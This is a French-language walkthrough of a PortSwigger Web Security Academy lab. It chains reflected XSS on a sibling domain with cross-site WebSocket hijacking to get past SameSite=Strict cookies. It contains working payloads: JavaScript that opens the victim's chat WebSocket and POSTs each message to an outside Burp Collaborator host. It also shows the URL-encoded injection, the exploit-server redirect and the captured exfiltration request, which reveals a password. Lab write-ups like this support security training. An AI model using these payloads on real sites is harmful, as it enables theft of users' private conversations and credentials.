# Lab

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

## Solution

Avec ce script, on arrive bien a récupérer l'historique du chat WS mais d'une nouvelle session puisque les headers ne sont pas envoyés.

```js
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Nous devons trouver un moyen de bypasser les contrôles de SameSite.

Sur la requête envoyée vers `/js/chat.js` on voit dans les headers de la réponse : `Access-Control-Allow-Origin: https://cms-0a5e00bb03b5e2928278ecf600700089.web-security-academy.net`.

Quand on accès à ce site on voit une page de connexion et quand on entre un mauvais username, il est reflété dans la réponse.

On peut donc faire du XSS avec le username par exemple :

`https://cms-0a5e00bb03b5e2928278ecf600700089.web-security-academy.net/login?username=<script>alert()</script>&password=`

On peut donc injecter notre POC CSRF dans l'url :

```js
<script>var ws = new WebSocket('wss://your-websocket-url');ws.onopen=function(){ws.send("READY");};ws.onmessage=function(event){fetch('https://your-collaborator-url',{method:'POST',mode: 'no-cors',body:event.data});};</script>
```

`https://cms-0a5e00bb03b5e2928278ecf600700089.web-security-academy.net/login?username=%3Cscript%3Evar%20ws%20=%20new%20WebSocket(%27wss://0a5e00bb03b5e2928278ecf600700089.web-security-academy.net/chat%27);ws.onopen=function(){ws.send(%22READY%22);};ws.onmessage=function(event){fetch(%27https://rkfzow0m94k1o4ab837keua5jwpndf14.oastify.com%27,{method:%27POST%27,mode:%20%27no-cors%27,body:event.data});};%3C/script%3E&password=lololo`

Et dans l'exploit serveur envoyer ce script :

```html
<script>window.location='https://cms-0a5e00bb03b5e2928278ecf600700089.web-security-academy.net/login?username=%3Cscript%3Evar%20ws%20=%20new%20WebSocket(%27wss://0a5e00bb03b5e2928278ecf600700089.web-security-academy.net/chat%27);ws.onopen=function(){ws.send(%22READY%22);};ws.onmessage=function(event){fetch(%27https://rkfzow0m94k1o4ab837keua5jwpndf14.oastify.com%27,{method:%27POST%27,mode:%20%27no-cors%27,body:event.data});};%3C/script%3E&password=lololo'</script>
```

Et sur Burp Collaborator on peut récupérer l'histoire du chat :

```http
POST / HTTP/1.1
Host: rkfzow0m94k1o4ab837keua5jwpndf14.oastify.com
Connection: keep-alive
Content-Length: 82
sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
sec-ch-ua-platform: "Linux"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://cms-0a5e00bb03b5e2928278ecf600700089.web-security-academy.net
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: https://cms-0a5e00bb03b5e2928278ecf600700089.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

{"user":"Hal Pline","content":"No problem carlos, it's oa4uyy5of98qtzpdxjod"}
```